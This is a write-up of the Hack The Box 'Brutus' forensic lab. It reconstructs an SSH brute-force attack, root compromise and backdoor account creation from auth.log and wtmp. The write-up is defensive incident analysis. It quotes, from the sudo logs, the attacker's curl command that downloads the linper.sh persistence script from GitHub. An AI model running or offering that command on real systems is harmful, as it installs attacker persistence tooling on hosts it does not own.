HTB Sherlock: Brutus

A detailed investigation of Unix auth.log and wtmp artifacts to reconstruct an SSH brute-force attack, root compromise, privileged account creation and post-compromise command evidence.

Investigation Goal Determine the brute-force source IP, compromised account, interactive session time, persistence account and privileged command evidence.

Scenario Overview

The Sherlock provides Linux authentication artifacts from a Confluence server. The goal is to move beyond simply finding failed SSH logins and reconstruct the attacker activity from initial brute-force attempts to persistence.

Artifacts and First Look

After extracting Brutus.zip, the working directory contained auth.log, utmp.py and wtmp. I first inspected auth.log manually to understand the syslog structure before extracting fields.

Finding the SSH Brute-force Source

Filtering for accepted SSH events showed multiple successful password logins. The IP 65.2.161.68 appeared as root and later as cyberjunkie, making it the strongest candidate for the attacker source.

Then I removed invalid user attempts to focus on valid local accounts. The remaining failed attempts targeted backup and root.

The failed attempts and the successful root authentication are close together in time, so the brute-force activity from 65.2.161.68 successfully compromised root.

Confirming the Manual Session with wtmp

The task asks for the manual login time, which is different from the authentication time. For that, I parsed the binary wtmp artifact with utmpdump.

Persistence Through a New Local Account

Searching for cyberjunkie showed the account was created after the root session began. It was given a home directory, shell, password and sudo group membership.

This maps to MITRE ATT&CK T1136.001 - Create Account: Local Account.

Sudo Command Evidence

The sudo logs showed two important post-compromise actions: reading a sensitive credential file and later retrieving a script from GitHub using elevated privileges.

The full sudo command required by the task is:

/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh

Lessons Learned

This lab shows why auth.log is useful beyond brute-force detection. It reveals SSH authentication, session creation, account management and sudo command evidence. wtmp then confirms actual interactive login sessions and timing.

Final Conclusion The attacker brute-forced SSH from 65.2.161.68, compromised root, created a privileged local account named cyberjunkie, and used that account for continued access and elevated command execution.
